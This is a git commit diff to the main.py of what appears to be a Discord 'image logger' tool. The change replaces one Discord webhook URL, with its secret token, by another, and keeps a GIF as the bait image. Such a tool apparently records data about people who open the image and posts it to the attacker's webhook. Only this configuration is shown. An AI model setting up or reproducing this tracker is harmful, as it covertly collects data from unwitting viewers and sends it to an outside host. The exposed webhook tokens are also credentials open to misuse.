0227a396bd7660434b63deb8727fdb1f69851800
Atilla2000 <emirboztepe33@gmail.com>
2025-09-11 19:49:01 +0300

    main.py

--- api/main.py
+++ api/main.py
@@ -12,7 +12,7 @@ __author__ = "MoonLight"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1415653942817198080/AwT4G4lyWXgEYf6KponaMA6XazwJ0iy0Lxsnyq90Hqi8TcDsr9oGPeu28eklfF3Bqq34",
+    "webhook": "https://discord.com/api/webhooks/1415740799672520766/ACMdiUlQeFqPMdul3N6xXi1iJChnJr1swUpscoTOB86nlBr3OX-pY6OHl2fupI0OxnMV",
     "image": "https://media.discordapp.net/attachments/1093454209329934382/1200425574036947004/little_kid.gif?ex=68c3712f&is=68c21faf&hm=1dcdf2f17da1ca8dd876cd09577e7c6507f5152c5e5b37c26689248977a8859a&=&width=635&height=960", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
